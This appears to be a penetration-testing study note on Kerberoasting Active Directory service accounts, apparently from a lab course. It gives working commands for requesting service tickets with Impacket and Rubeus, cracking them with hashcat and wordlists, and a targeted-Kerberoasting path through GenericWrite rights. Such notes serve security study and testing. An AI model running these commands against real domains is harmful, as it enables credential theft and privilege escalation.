> [!tip] Discovery
> Enumerate SPN-backed service accounts first: [[Active Directory/PowerView & Manual AD Enumeration#8. SPN / service-account enumeration|SPN / service-account enumeration]].

What & why

**Service accounts (any account with an "SPN") can be targeted by any logged-in user.** You request a service ticket for them, and part of that ticket is encrypted with the service account's password — so you crack it offline. These accounts often have weak, never-rotated passwords, making this one of the most reliable AD wins. **Prerequisite:** valid domain creds (you have them) + an SPN account (BloodHound → "Find Kerberoastable Users"). Add `best64.rule` to hashcat for tougher passwords.

```
GetUserSPNs.py corp.local/stephanie:'Password123' \
    -dc-ip 192.168.x.100 -request -outputfile kerb.txt

# Windows (Rubeus):
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt

# Crack:
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## Prioritize user-backed SPNs

Kerberoasting is most practical against SPNs running under **normal user/service accounts** with weak passwords.

Computer accounts, managed service accounts (MSA), and group-managed service accounts (gMSA) normally use long randomly generated passwords, so cracking their TGS material is generally infeasible.

## Targeted Kerberoasting

If you have **GenericWrite** or **GenericAll** over another user, you can set an SPN on that user, request a TGS, crack it, and then **remove the SPN afterward**.

```text
GenericWrite / GenericAll over user
        ↓
assign SPN to target user
        ↓
request TGS
        ↓
hashcat -m 13100
        ↓
remove added SPN
```

See [[Active Directory/Attack-Phases/Phase4-Pivot to MS02/ACL Abuse — Common BloodHound Paths|ACL Abuse]].

## Kerberos clock skew troubleshooting

Kerberos is time-sensitive. If Impacket returns:

```text
KRB_AP_ERR_SKEW(Clock skew too great)
```

Synchronize Kali with the DC:

```bash
sudo ntpdate <DC_IP>
# or
sudo rdate -n <DC_IP>
```
